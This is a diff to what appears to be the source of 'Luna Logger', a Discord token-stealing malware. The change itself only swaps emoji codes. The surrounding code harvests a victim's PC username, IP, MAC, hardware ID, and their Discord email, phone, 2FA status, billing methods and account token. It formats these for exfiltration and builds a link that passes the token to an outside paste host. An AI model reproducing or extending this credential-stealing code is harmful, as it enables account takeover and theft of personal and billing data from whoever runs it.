@@ -85,7 +85,7 @@ class grabpcinfo():
         gpu = wmi.WMI().Win32_VideoController()[0]
         ram = round(float(wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize) / 1048576, 0)
 
-        embed.add_field(name="System Info", value=f'''💻 `PC Username:` **{username}**\n<:computer_2:996126609650225322> `PC Name:` **{hostname}**\n🌐 `OS:` **{computer_os}**\n\n👀 `IP:` **{ip}**\n🍏 `MAC:` **{mac}**\n🔧 `HWID:` **{hwid}**\n\n<:cpu:996126314555768882> `CPU:` **{cpu.Name}**\n<:gpu:996126996952272906> `GPU:` **{gpu.Name}**\n<:rgbram:996127801025495081> `RAM:` **{ram}GB**''', inline=False)
+        embed.add_field(name="System Info", value=f'''💻 `PC Username:` **{username}**\n:desktop: `PC Name:` **{hostname}**\n🌐 `OS:` **{computer_os}**\n\n👀 `IP:` **{ip}**\n🍏 `MAC:` **{mac}**\n🔧 `HWID:` **{hwid}**\n\n<:cpu:1024720072075399250> `CPU:` **{cpu.Name}**\n<:gpu:1024720328062156892> `GPU:` **{gpu.Name}**\n<:rgbram:1024720542214930462> `RAM:` **{ram}GB**''', inline=False)
         embed.set_footer(text="Luna Logger | Created by Smug")
         embed.set_thumbnail(url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096")
 
@@ -285,7 +285,7 @@ class grabtokens():
                 except TypeError: 
                     methods += "❓"
 
-                val += f'<:1119pepesneakyevil:972703371221954630> `Discord ID:` **{discord_id}** \n<:gmail:996083031632773181> `Email:` **{email}**\n<:mobilephone:996101721879224331> `Phone:` **{phone}**\n\n<:2fa:996102455744012428> `2FA:` **{mfa}**\n<a:nitroboost:996004213354139658> `Nitro:` **{nitro}**\n<:billing:996099943574012024> `Billing:` **{methods}**\n\n<:pepehappy:996100452112400526> `Token:` **{token}**\n[Click to copy!](https://paste-pgpj.onrender.com/?p={token})\n'
+                val += f'<:1119pepesneakyevil:972703371221954630> `Discord ID:` **{discord_id}** \n<:gmail:1024717106996064296> `Email:` **{email}**\n:mobile_phone: `Phone:` **{phone}**\n\n<:2fa:1024718014278533212> `2FA:` **{mfa}**\n<a:nitroboost:996004213354139658> `Nitro:` **{nitro}**\n<:billing:1024718620896538787> `Billing:` **{methods}**\n\n<:crown1:1024719305482444851> `Token:` **{token}**\n[Click to copy!](https://paste-pgpj.onrender.com/?p={token})\n'
 
                 g = requests.get("https://discord.com/api/v9/users/@me/outbound-promotions/codes",headers=headers)
 
